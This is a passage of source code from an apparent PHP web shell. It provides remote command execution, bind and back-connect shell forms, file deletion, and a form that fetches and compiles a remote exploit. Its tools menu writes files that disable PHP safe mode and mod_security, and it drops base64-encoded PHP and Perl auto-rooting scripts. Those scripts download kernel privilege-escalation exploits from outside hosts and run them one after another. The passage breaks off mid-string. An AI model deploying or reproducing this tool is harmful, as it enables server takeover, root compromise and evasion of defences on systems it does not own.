<input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form></table></td><td><table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit"><tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr>
<tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
<input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form></table></td><td><table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit"><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr>
<tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td>
</tr><tr><td><select size="1" class="inputz" name="pilihan"><option value="wwget">wget</option><option value="wlynx">lynx</option><option value="wfread">fread</option><option value="wfetch">fetch</option><option value="wlinks">links</option><option value="wget">GET</option><option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form>
</table></td></tr></table><div style="text-align:center;margin:2px;"><?php echo $msg; ?></div><?php } elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?><form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"><table class="cmdbox">
<tr><td colspan="2"><textarea class="output" readonly><?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']);} ?></textarea>
<tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table></form><?php } 
else { 
if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	@unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
	@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd.$_GET['mkdir'];
	@mkdir($path);
}
	$buff = showdir($pwd,$prompt);
	echo $buff;
}
?>
<br><table class="tabnet" >
<tr><form method="post" action="">&nbsp;<td><select class="inputzbut" align="left"  name="pilihan" id="pilih"><option value=""selected>------[ Select Your Favorit Tools ]------</option><option value="htasell">htaccess Shell [ .htaccess ]</option><option value="rrot" >Perl Auto Rooting [ r00t.pl ]</option><option value="inisial" >PHP Auto Rooting [ r00t.php ]</option><option value="slc" >Server Log Cleaner [ serverLC.sh ]</option><option value="port" >Python Open Port 13123 [ port.py ]</option><option value="ini">Bypass Disable Function in Apache</option><option value="inis">Bypass Disable Function in Litespeed</option></select>
<input  type="submit" name="submites" class="inputzbut" value="Created">
</td></form></tr></table>
<?php
$submit = $_POST ['submites'];
if(isset($submit)) {
	$pilih = $_POST['pilihan'];
		if ( $pilih == 'ini') {
			$byphp = "safe_mode = Off \n disable_functions = None \n safe_mode_gid = OFF \n open_basedir = OFF \n allow_url_fopen = On";
			$byht = "<IfModule mod_security.c> \n SecFilterEngine Off \n SecFilterScanPOST Off \n  SecFilterCheckURLEncoding Off \n  SecFilterCheckUnicodeEncoding Off \n  </IfModule>";
			$iniphp = '<? \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
			file_put_contents("php.ini",$byphp);
			file_put_contents(".htaccess",$byht);
			file_put_contents("ini.php",$iniphp);
			echo "<script>alert('Disable Functions in Apache Created'); hideAll();</script>";
die();
		}
		elseif ( $pilih == 'inis') {
		$iniph = '<? \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
			 $byph = "safe_mode = Off \n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
die();
		}
		elseif ( $pilih == 'inisial') {
		$rroter ="IyEvdXNyL2Jpbi9waHAgDQo8P3BocCANCi8qIA0KIyBBdXRvIHJvb3QgMjAxMyBEZXZlbG9wcGVkIGJ5IE1hdXJpdGFuaWEgQXR0YWNrZXINCiMgd3d3Lm1hdXJpdGFuaWEtc2VjLmNvbQ0KIyBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWF1cml0YW5pZS5mb3JldmVyDQojIDwzIEFub25HaG9zdCA8MyANCiovIA0Kc2V0X3RpbWVfbGltaXQoMCk7IA0Kc3lzdGVtKCJjbGVhciIpOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS0tLS0tfFxuIjsgDQpwcmludCAifFBIUCBBdXRvIFJvb3QgYnkgTWF1cml0YW5pYSBBdHRhY2tlciAgICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInwtLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLS0tLS0tLS0tLS18XG4iOyANCnByaW50ICJ8Q29udGFjdDogZmIuY29tL21hdXJpdGFuaWUuZm9yZXZlciAgICAgICAgICAgICAgICAgfFxuIjsgDQpwcmludCAifFByaXY4IFZlcnNpb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInxSb290aW5nOiBMaW51eCBhbmQgRnJlZUJTRCAgICAgICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8PDMgQW5vbkdob3N0IDwzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsgDQpwcmludCAifC0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tLS0tLS0tLS0tLXxcbiI7IA0Kc2xlZXAoNCk7IA0KcHJpbnQgIlxuS2VybmVsIHRvIHZlcmlmeTpcbiI7IA0KcHJpbnQgImxueCBvciBic2Q6ICI7IA0KJGtlcm5lbCA9IGZnZXRzKFNURElOKTsgDQoka2VybmVsID0gdHJpbSgka2VybmVsKTsgDQppZigka2VybmVsID09ICJsbngiKSANCnsgDQpwcmludCAifC0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tPS0tLS0tLS0tLS18XG4iOyANCnByaW50ICJ8UEhQIEF1dG8gUm9vdCBieSBNYXVyaXRhbmlhIEF0dGFja2VyICAgICAgICAgICAgIHxcbiI7IA0KcHJpbnQgInwtLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLT0tLS0tLS0tLS0tfFxuIjsgDQpwcmludCAifFNlbGVjdGVkIGtlcm5lbCA6IHxMaW51eCBhcnF8ICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS0tLXxcbiI7IA0Kc2xlZXAoMik7IA0KcHJpbnQgIlxuWytdIFRlc3RpbmcgbG54IHhwbCdzIHBsZWFzZSB3YWl0LlxuIjsgDQpwcmludCAiW35dIE1lYW53aGlsZSBzbW9rZSBhIGNpZ2FyZXQgWEQgKDpcbiI7IA0Kc2xlZXAoMik7IA0Kc3lzdGVtKCJta2RpciBsbng7Y2QgbG54LyIpOyANCg0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuM2FsbCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zYWxsIik7IA0Kc3lzdGVtKCIuLzIuNi4zYWxsIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTciKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTciKTsgDQpzeXN0ZW0oIi4vMi42LjE3Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgiKTsgDQpzeXN0ZW0oIi4vMi42LjE4Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgtNiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC02Iik7IA0Kc3lzdGVtKCIuLzIuNi4xOC02Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMTgtMjAiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMjAiKTsgDQpzeXN0ZW0oIi4vMi42LjE4LTIwIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzIiKTsgDQpzeXN0ZW0oIi4vMi42LjMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzJfaTY4NiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMl9pNjg2Iik7IA0Kc3lzdGVtKCIuLzIuNi4zMl9pNjg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzJuaW5lIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjMybmluZSIpOyANCnN5c3RlbSgiLi8yLjYuMzJuaW5lIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzMiKTsgDQpzeXN0ZW0oIi4vMi42LjMzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzQiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQiKTsgDQpzeXN0ZW0oIi4vMi42LjM0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzQtMjAxMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNC0yMDExIik7IA0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzciKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzciKTsgDQpzeXN0ZW0oIi4vMi42LjM3Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzdyYzIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzdyYzIiKTsgDQpzeXN0ZW0oIi4vMi42LjM3cmMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzctcmMyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3LXJjMiIpOyANCnN5c3RlbSgiLi8yLjYuMzctcmMyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzktMjAxMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zOS0yMDExIik7IA0Kc3lzdGVtKCIuLzIuNi4zOS0yMDExIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYuMzktMjAxMS0yMDEyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM5LTIwMTEtMjAxMiIpOyANCnN5c3RlbSgiLi8yLjYuMzktMjAxMS0yMDEyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yLjYueCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDIuNi54Iik7IA0Kc3lzdGVtKCIuLzIuNi54Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8xNSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE1Iik7IA0Kc3lzdGVtKCIuLzE1Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC8yMDEwLTEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDEwLTEiKTsgDQpzeXN0ZW0oIi4vMjAxMC0xIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9hYiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGFiIik7IA0Kc3lzdGVtKCIuL2FiIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgYyIpOyANCnN5c3RlbSgiLi9jIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbDVpMzg2Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZWw1aTM4NiIpOyANCnN5c3RlbSgiLi9lbDVpMzg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbDV4ODYiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBlbDV4ODYiKTsgDQpzeXN0ZW0oIi4vZWw1eDg2Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9lbGZsYmwiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBlbGZsYmwiKTsgDQpzeXN0ZW0oIi4vZWxmbGJsIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAxIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOyANCnN5c3RlbSgiLi9leHAxIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHAzIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMyIpOyANCnN5c3RlbSgiLi9leHAzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHBsb2l0Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOyANCnN5c3RlbSgiLi9leHBsb2l0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9leHBsb2l0MiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9mcm9vdCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGZyb290Iik7IA0Kc3lzdGVtKCIuL2Zyb290Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9nbGliYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGdsaWJjIik7IA0Kc3lzdGVtKCIuL2dsaWJjIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBpc2tvcnBpdHgiKTsgDQpzeXN0ZW0oIi4vaXNrb3JwaXR4Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9qZXNzaWNhMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGplc3NpY2EyIik7IA0Kc3lzdGVtKCIuL2plc3NpY2EyIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9wa2V4ZWMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBwa2V4ZWMiKTsgDQpzeXN0ZW0oIi4vcGtleGVjIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9yZHMtZXhwbG9pdCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJkcy1leHBsb2l0Iik7IA0Kc3lzdGVtKCIuL3Jkcy1leHBsb2l0Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC92bXNwbGljZSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlIik7IA0Kc3lzdGVtKCIuL3Ztc3BsaWNlIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC94cGxTVVBFUiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHhwbFNVUEVSIik7IA0Kc3lzdGVtKCIuL3hwbFNVUEVSIik7IA0Kc2xlZXAoMSk7IA0KcHJpbnQoIlsrXSBhbGwgbG54IHhwbCdzIHRlc3RlZHMhIGV4aXRpbmchXG4iKTsgDQpzeXN0ZW0oImlkIik7IA0KZXhpdCgwKTsgDQp9IA0KZWxzZWlmKCRrZXJuZWwgPT0gImJzZCIpIA0KeyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnByaW50ICJ8UEhQIEF1dG8gUm9vdCBieSBNYXVyaXRhbmlhIEF0dGFja2VyICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnByaW50ICJ8U2VsZWN0ZWQga2VybmVsIDogfEJTRC1hcnF8ICAgICAgICAgICAgICAgICAgICB8XG4iOyANCnByaW50ICJ8LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS09LS0tLS0tLS18XG4iOyANCnNsZWVwKDIpOyANCnByaW50ICJcblsrXSBUZXN0aW5nIGJzZCB4cGwncyBwbGVhc2Ugd2FpdC5cbiI7IA0KcHJpbnQgIlt+XSBNZWFud2hpbGUgc21va2UgYSBjaWdhcmV0IFhEICg6XG4iOyANCnNsZWVwKDIpOyANCnN5c3RlbSgibWtkaXIgQlNEO2NkIGJzZC8iKTsgDQoNCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC82LjEtMDkuYyIpOyANCnN5c3RlbSgiZ2NjIC1vIDYuMS0wOSA2LjEtMDkuYyAtbHB0aHJlYWQiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA2LjEtMDkiKTsgDQpzeXN0ZW0oIi4vNi4xLTA5Iik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNELzYuNCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDYuNCIpOyANCnN5c3RlbSgiLi82LjQiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvNy4xLTA4LmMiKTsgDQpzeXN0ZW0oImdjYyAtbyA3LjEtMDggNy4xLTA4LmMgIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgNy4xLTA4Iik7IA0Kc3lzdGVtKCIuLzcuMS0wOCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC8yMDEwIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAxMCIpOyANCnN5c3RlbSgiLi8yMDEwIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNEL2Eub3V0Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgYS5vdXQiKTsgDQpzeXN0ZW0oIi4vYS5vdXQiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvY2Via21vdW50Iik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgY2Via21vdW50Iik7IA0Kc3lzdGVtKCIuL2NlYmttb3VudCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC9jdmUtMjAxMC0yNjkzIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgY3ZlLTIwMTAtMjY5MyIpOyANCnN5c3RlbSgiLi9jdmUtMjAxMC0yNjkzIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNELzYuMS0wOS5jIik7IA0Kc3lzdGVtKCJnY2MgLW8gNi4xLTA5IDYuMS0wOS5jIC1scHRocmVhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDYuMS0wOSIpOyANCnN5c3RlbSgiLi82LjEtMDkiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvZnJlZTcuc2giKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBmcmVlNy5zaCIpOyANCnN5c3RlbSgiLi9mcmVlNy5zaCIpOyANCnNsZWVwKDEpOyANCnN5c3RlbSgid2dldCBodHRwOi8vMTg0LjIyLjIxOS41MC94cGwvRnJlZUJTRC9sIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgbCIpOyANCnN5c3RlbSgiLi9sIik7IA0Kc2xlZXAoMSk7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly8xODQuMjIuMjE5LjUwL3hwbC9GcmVlQlNEL21hc3RlciIpOyANCnN5c3RlbSgiY2htb2QgNzc3IG1hc3RlciIpOyANCnN5c3RlbSgiLi9tYXN0ZXIiKTsgDQpzbGVlcCgxKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovLzE4NC4yMi4yMTkuNTAveHBsL0ZyZWVCU0QvdzAwdC5zby4xLjAiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyB3MDB0LnNvLjEuMCIpOyANCnN5c3RlbSgiLi93MDB0LnNvLjEuMCIpOyANCmV4aXQoMCk7IA0KfSANCg0KLy9FT0ZfIA0KLy8yMDEzIA0KLy9Qcml2OCBWZXJzaW9uICANCg0KPz4=";
		file_put_contents("r00t.php",base64_decode($rroter));
		echo "<script>alert('Auto R00ting Created'); hideAll();</script>";
		die();
		}
		elseif ( $pilih == 'rrot' ){
		$perlrot = "IyEvdXNyL2Jpbi9wZXJsDQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgICAgQXV0b3Jvb3QgQnkgR2FiYnkgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgVGhhbmtzIHRvIDogWW9neWFjYXJkZXJsaW5rIC0gU3VyYWJheWEgQmxhY2toYXQgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgIC0gVGhlIENyb3dzIENyZXcgLSAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICIjPT09PT09PT09PT09PT09PT09PT09WyBVc2FnZSBdPT09PT09PT09PT09PT09PT09PT0jXG4iOw0KcHJpbnQgInwgR2V0IFJvb3QgICAgICAgICA9IHBlcmwgJDAgcm9vdCAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCBDbGVhciBMb2NhbCBSb290ID0gcGVybCAkMCBkZWwgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8IEFkZCBVc2VyIFJvb3QgICAgPSBwZXJsICQwIGFkZCAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgQ2xlYXIgTG9nICAgICAgICA9IHBlcmwgJDAgcm0gICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fFxuIjsNCnByaW50ICJ8IENvbnRhY3QgTWUgOiBnYWJieVthdF10aGVjcm93c2NyZXcub3JnICAgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXSNcbiI7DQppZiAoJEFSR1ZbMF0gPX4gInJvb3QiICkgDQp7DQpwcmludCAiU2lhcGluIHJva29rIG1hIGtvcGkgZHVsdSBtYXMgbWJsbyA6UCBcbiI7DQpwcmludCAiT2ssLi4gTGV0cyBzdGFydC4uLiBTYXBhcmF0b3MgQmxhbmsuLi4uISEhIFxuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0yIik7DQpzeXN0ZW0oIi4vMS0yIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS0zIik7DQpzeXN0ZW0oIi4vMS0zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMS00Iik7DQpzeXN0ZW0oIi4vMS00Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTM3NC4xMi4xLmVsNS0yMDEyIik7DQpzeXN0ZW0oIi4vMi42LjE4LTM3NC4xMi4xLmVsNS0yMDEyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMCIpOw0Kc3lzdGV